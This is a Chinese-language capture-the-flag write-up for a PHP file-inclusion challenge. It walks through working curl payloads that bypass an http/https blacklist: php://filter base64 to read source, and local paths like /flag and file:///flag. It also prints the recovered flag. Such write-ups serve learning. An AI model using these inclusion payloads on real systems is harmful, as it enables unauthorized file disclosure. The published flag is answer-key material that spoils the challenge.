# 20-rfi-wrapper-bypass

## 题目

- 地址：`http://47.120.76.57:34289`
- 目标：拿到 `TOGOGO-flag{}`
- 关键点：`RFI / 文件包含 / PHP wrapper 绕过`

## 一句话思路

页面用 `?url=` 动态加载插件，后端只过滤了 `http://` 和 `https://`，但是没有过滤本地文件路径和 `php://filter` 等伪协议，所以可以直接包含 `/flag`。

## 手工复刻

### 1. 进入目录并激活环境

```bash
cd /Users/zlux/Project/Active/gkdctf/20-rfi-wrapper-bypass
source /Users/zlux/Project/Active/gkdctf/.venv/bin/activate
```

### 2. 打开首页看提示

```bash
curl -i 'http://47.120.76.57:34289/'
```

能看到类似提示：

```html
?url=<插件地址>
已过滤远程 http(s):// 协议
Flag 文件位置：/flag
```

说明入口参数是 `url`。

### 3. 用 php://filter 读取源码确认漏洞

```bash
curl 'http://47.120.76.57:34289/?url=php://filter/convert.base64-encode/resource=index.php'
```

返回是一段 Base64，解码：

```bash
curl -s 'http://47.120.76.57:34289/?url=php://filter/convert.base64-encode/resource=index.php' | base64 -d
```

关键源码：

```php
$url = $_GET['url'] ?? '';
if (stripos($url, 'http://') === 0 || stripos($url, 'https://') === 0) {
    die('remote http(s) is not allowed');
}
include $url;
```

解释：只拦了 `http/https`，但是 `include $url` 仍然可以包含本地文件。

### 4. 直接包含 /flag

```bash
curl 'http://47.120.76.57:34289/?url=/flag'
```

得到：

```text
TOGOGO-flag{7b01efbe-6823-46e6-a95d-bc79fede36b3}
```

也可以用 `file://`：

```bash
curl 'http://47.120.76.57:34289/?url=file:///flag'
```

## 运行脚本

```bash
cd /Users/zlux/Project/Active/gkdctf/20-rfi-wrapper-bypass
source /Users/zlux/Project/Active/gkdctf/.venv/bin/activate
python3 main.py
```

预期输出：

```text
[+] FLAG: TOGOGO-flag{7b01efbe-6823-46e6-a95d-bc79fede36b3}
```

## 漏洞原因

后端把用户传入的 `url` 直接传给 `include`，只做了黑名单过滤：

- 禁止：`http://`、`https://`
- 没禁止：`/flag`、`file://`、`php://filter`

所以绕过远程协议过滤后，可以用本地文件包含读取 flag。

## Flag

```text
TOGOGO-flag{7b01efbe-6823-46e6-a95d-bc79fede36b3}
```
